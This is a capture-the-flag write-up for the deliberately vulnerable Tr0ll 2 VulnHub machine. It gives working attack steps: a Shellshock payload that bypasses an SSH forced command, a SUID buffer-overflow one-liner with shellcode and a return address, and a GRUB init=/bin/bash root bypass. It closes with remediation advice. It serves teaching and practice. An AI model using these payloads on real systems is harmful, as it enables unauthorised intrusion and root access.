# Tr0ll 2 — Writeup

**Difficulty:** Beginner/Intermediate  
**Category:** VulnHub — Boot2Root  
**OS:** Ubuntu 12.04 LTS (32-bit)  
**Platform:** [VulnHub](https://www.vulnhub.com/entry/tr0ll-2,107/)

---

## Overview

Tr0ll 2 builds on the first VM with more misdirection. It combines FTP credential access, web steganography, base64 decoding, Shellshock (CVE-2014-6271) via SSH `command=` bypass, and a classic 32-bit SUID stack buffer overflow. The challenge also includes troll mechanics: SUID binaries shuffle on each reboot to make you pick the right door.

**Vulnerabilities exploited:**
- FTP with non-anonymous credentials (found via web hints)
- Steganography + base64 wordlist in web image metadata
- Shellshock CVE-2014-6271 via SSH `command=` restriction bypass
- SUID binary stack buffer overflow (no ASLR, no NX, no canary)

---

## Prerequisites

- VirtualBox or VMware
- Kali Linux (attacker)
- Tools: `nmap`, `ftp`, `wget`, `base64`, `unzip`, `ssh`, `gdb`, `python2`

---

## Attack Summary

```
FTP (Tr0ll:Tr0ll) → lmao.zip → HTTP /y0ur_self/answer.txt
→ base64 decode → ZIP password → noob RSA key
→ SSH Shellshock bypass (CVE-2014-6271)
→ SUID r00t BOF (offset 268) → root shell → flag
```

---

## Enumeration

### Host Discovery

```bash
nmap -sn 192.168.56.0/24
# → 192.168.56.106
```

### Port Scan

```bash
nmap -sV -p 21,22,80 192.168.56.106
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4
80/tcp open  http    Apache httpd 2.2.22
```

### HTTP Enumeration

```bash
curl http://192.168.56.106/robots.txt
```

`robots.txt` lists 20+ disallowed directories (mostly decoys). One of them — `/dont_bother/` — contains a JPEG image:

```bash
wget http://192.168.56.106/dont_bother/cat_the_troll.jpg
tail -c 100 cat_the_troll.jpg
# → "Look Deep within y0ur_self for the answer"
```

This hints at the path `/y0ur_self/`:

```bash
wget http://192.168.56.106/y0ur_self/answer.txt
```

---

## Exploitation

### Step 1: FTP Login

```bash
ftp 192.168.56.106
# Name: Tr0ll
# Password: Tr0ll

ftp> get lmao.zip
ftp> bye
```

The zip is password-protected.

### Step 2: Decode ZIP Password from answer.txt

```bash
base64 -d answer.txt > decoded.txt
# The password is the line with exactly 30 characters
awk 'length==30' decoded.txt
# → ItCantReallyBeThisEasyRightLOL
```

### Step 3: Extract RSA Key from ZIP

```bash
unzip -P ItCantReallyBeThisEasyRightLOL lmao.zip
# → extracts: noob (PEM RSA private key)
chmod 600 noob
```

### Step 4: SSH Shellshock Bypass (CVE-2014-6271)

Normal connection is restricted:

```bash
ssh -i noob noob@192.168.56.106
# → TRY HARDER LOL!
# (forced command in authorized_keys)
```

The `authorized_keys` contains `command="echo TRY HARDER LOL!"` before the public key. Old bash (< 4.3 patch) is vulnerable to Shellshock: function definitions in environment variables execute arbitrary code before the forced command runs.

Bypass:

```bash
ssh -i noob \
    -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    -o HostKeyAlgorithms=+ssh-rsa \
    noob@192.168.56.106 \
    -t "() { :; }; /bin/bash"
```

Expected:
```
noob@Tr0ll2:~$ id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
```

---

## Privilege Escalation

### Step 5: Locate SUID Binaries

```bash
ls -la /nothing_to_see_here/choose_wisely/
# door1/  door2/  door3/
# Each contains an r00t binary — only ONE is the buffer overflow target.
# The other two: one removes permissions for 2 minutes, one reboots the VM.

ls -la /nothing_to_see_here/choose_wisely/door*/r00t
# Find the binary with 8401 bytes — that is the BOF binary.
# Example:
# -rwsr-xr-x 1 root root 8401 ... door2/r00t   ← this is the one
```

> Binaries shuffle on reboot. Always identify by file size (8401 bytes), not by door number.

### Step 6: Find EIP Offset with GDB

```bash
gdb -q /nothing_to_see_here/choose_wisely/door2/r00t
(gdb) run $(python -c "print 'A'*268 + 'B'*4 + 'C'*16")
# Program received signal SIGSEGV, Segmentation fault.
# 0x42424242 in ?? ()   ← EIP = "BBBB"
```

Offset = **268 bytes**

Find ESP:
```bash
(gdb) x $esp
# 0xbffffb50: 0x43434343
# Real (outside GDB): ~0xbffffb90 (add ~0x40 to account for env difference)
```

### Step 7: Buffer Overflow Exploit

Shellcode: Linux x86 `execve("/bin/sh")` — 19 bytes:
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
```

Run from the Shellshock shell, inside the correct door directory:

```bash
DOOR=/nothing_to_see_here/choose_wisely/door2
cd $DOOR
./r00t $(python -c 'print "A"*268 + "\x90\xfb\xff\xbf" + "\x90"*16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
```

Expected:
```
# id
uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)
# whoami
root
```

---

## Root Flag

```bash
cat /root/Proof.txt
```

```
You win this time young Jedi...

a70354f0258dcc00292c72aab3c8b1e4
```

**Flag:** `a70354f0258dcc00292c72aab3c8b1e4`  
**Path:** `/root/Proof.txt`

---

## Alternative Path: GRUB Direct Root

If SSH or networking fails, you can get root directly via GRUB:

1. Reset VM, hold **Shift** at boot → GRUB menu appears
2. Press `e` to edit the first entry
3. Navigate to the `linux` line, press `Ctrl+E` to go to end of line
4. Append: `rw init=/bin/bash`
5. Press `Ctrl+X` to boot
6. System drops to a root shell — no password required
7. `cat /root/Proof.txt`

---

## Lessons Learned

- **Shellshock** (CVE-2014-6271): The `command=` restriction in `authorized_keys` is bypassed because old bash executes function definitions in environment variables *before* running the forced command. Solution: patch bash to ≥ 4.3.
- **Steganography**: Metadata appended to JPEG files is a common CTF technique for hiding hints. Use `exiftool`, `strings`, or `tail` to inspect images.
- **SUID BOF**: Compiled without stack canary (`-fno-stack-protector`), NX, or ASLR. A simple ret-addr overwrite with shellcode in a NOP sled is sufficient.
- **Troll mechanics**: Binary shuffling on reboot forces size-based identification rather than location-based. Always fingerprint by file size.

## Remediation

- Upgrade bash to a version that does not execute functions from environment variables in the Shellshock pattern
- Do not use RSA keys with `command=` restrictions alone — they are insufficient against Shellshock
- Compile SUID binaries with `-fstack-protector-all`, enable ASLR system-wide, and mark the stack NX
- Minimize SUID binaries; prefer `sudo` with least-privilege rules
